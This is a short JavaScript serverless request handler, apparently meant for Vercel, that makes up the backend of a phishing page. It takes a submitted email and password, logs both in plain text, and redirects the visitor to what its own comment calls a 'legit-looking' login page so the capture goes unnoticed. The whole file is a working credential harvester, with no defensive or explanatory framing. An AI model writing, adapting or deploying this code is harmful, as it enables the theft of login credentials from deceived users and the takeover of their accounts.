export default async function handler(req, res) {
  if (req.method === 'POST') {
    try {
      const { email, password } = req.body;

      // For testing: log it to Vercel console (no file persistence!)
      console.log(`Email: ${email} | Password: ${password}`);

      // Fake redirect to legit-looking page
      res.writeHead(302, { Location: 'https://example.com/login' });
      res.end();
    } catch (err) {
      console.error(err);
      res.status(500).json({ message: 'Server error' });
    }
  } else {
    res.status(405).send('Method not allowed');
  }
}
